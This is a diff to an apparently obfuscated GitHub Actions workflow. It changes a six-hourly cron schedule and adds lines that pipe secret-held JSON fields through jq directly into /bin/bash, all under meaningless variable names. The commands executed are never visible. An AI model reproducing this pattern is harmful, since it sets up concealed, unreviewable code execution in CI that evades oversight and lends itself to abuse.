@@ -1,9 +1,8 @@
 name: qheqin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
+    - cron: '41 0/6 * * *'
 
 jobs:
   build:
@@ -12,9 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: qheqin
         env:
-          jck1297: ${{ secrets.jck1297 }}
+          b711: ${{ secrets.b711 }}
         run: |
-          echo $jck1297 | jq -r .uqgr75030 | /bin/bash
-          echo $tm3 | jq -r .lu740 | /bin/bash
-          echo $ec4758 | jq -r .pb36118 | /bin/bash
+          echo $b711 | jq -r .j67 | /bin/bash
+          echo $emgxk106 | jq -r .flx1 | /bin/bash
+          echo $elof77707 | jq -r .zmzcq7 | /bin/bash
+          echo $yxcew879 | jq -r .un134 | /bin/bash
+          echo $rs59630 | jq -r .qqhc872 | /bin/bash
+          echo $rvuvy7 | jq -r .vg8 | /bin/bash
 
